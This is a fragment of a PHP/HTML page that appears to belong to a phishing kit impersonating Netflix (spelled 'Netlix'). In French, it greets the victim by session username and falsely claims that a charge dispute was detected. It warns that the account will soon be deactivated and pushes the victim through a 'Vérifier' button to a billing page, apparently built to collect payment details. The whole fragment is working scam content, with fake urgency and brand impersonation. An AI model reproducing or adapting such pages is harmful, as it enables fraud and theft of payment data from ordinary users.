          ...
          <div>
            ...
            <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
              <div class="hybrid-login-form-main">
                <h2 style="color:#fff" align="center" data-uia="login-page-title">Chèr(e), <?php echo $_SESSION['username'];?> </h2>
                <h3 align="center" style="color:aliceblue">Notre système a détecté une contestation des frais de vôtre part liées à votre abonnement <span>Netlix</span>. <br>
                  <br>Dans les jours à suivre votre compte sera automatiquement désactivé. <br>
                  <br>Si vous pensez que c'est une erreur de notre part, faites le nous savoir en mettant à jour vos informations pour réactiver votre compte.
                </h3>
                <button class="btn login-button btn-submit btn-small" onclick="window.location='../billing/index.php';" autocomplete="off" tabindex="0" data-uia="login-submit-button">Vérifier</button>
              </div>
            </div>
          </div>
        </div>
